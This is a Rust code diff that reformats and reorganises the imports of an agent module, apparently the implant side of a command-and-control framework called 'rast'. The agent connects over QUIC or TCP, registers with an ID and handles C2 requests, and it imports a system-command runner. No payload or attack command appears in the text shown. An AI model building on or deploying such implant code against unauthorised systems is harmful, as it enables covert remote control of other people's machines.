@@ -6,7 +6,8 @@ use anyhow::{bail, Result};
 use commands::Commands;
 use futures_util::sink::SinkExt;
 use rast::{
-    encoding::JsonPackager,
+    encoding::{Encoding, JsonPackager, Packager},
+    messages::{AgentInit, Message, MessageZone},
     protocols::{quic::QuicFactory, tcp::TcpFactory, Messager, ProtoConnection, ProtoFactory},
     settings::{Connection, Settings},
     RastError,
@@ -14,13 +15,12 @@ use rast::{
 use tokio::{process::Command as SystemCommand, sync::Mutex};
 use tracing::{debug, info, trace};
 use ulid::Ulid;
-use rast::encoding::{Encoding, Packager};
-use rast::messages::{AgentInit, Message, MessageZone};
+
 use crate::{
     commands::{Command, CommandOutput},
     context::Context,
+    messages::{AgentResponse, C2Request},
 };
-use crate::messages::{AgentResponse, C2Request};
 
 pub mod commands;
 pub mod context;
@@ -72,11 +72,13 @@ impl RastAgent {
         let mut conn = self.connection.lock().await;
         let mut messager = Messager::with_packager(&mut *conn, JsonPackager);
 
-        let init = AgentInit {
-            ulid: self.ulid,
-        };
+        let init = AgentInit { ulid: self.ulid };
         let init = JsonPackager::encode(&init).unwrap();
-        let init = Message::new(MessageZone::External(self.ulid), Encoding::Json, init.into());
+        let init = Message::new(
+            MessageZone::External(self.ulid),
+            Encoding::Json,
+            init.into(),
+        );
         if let Err(e) = messager.send(&init).await {
             debug!("Failed to send init message: {:?}", e);
         };
@@ -90,7 +92,6 @@ impl RastAgent {
 
                 if let Ok(c2req) = JsonPackager::decode(&msg.data) {
                     match self.handle_message(c2req).await {
-
                         Ok(response) => {
                             let encoded = JsonPackager::encode(&response).unwrap();
                             let response = msg.respond(encoded.into());
@@ -104,11 +105,10 @@ impl RastAgent {
                     }
                 }
             }
-        };
+        }
     }
 
     fn validate_message(&self, msg: &Message) -> bool {
-        
         match msg.zone {
             MessageZone::Internal => false,
             MessageZone::External(ulid) => ulid == self.ulid,
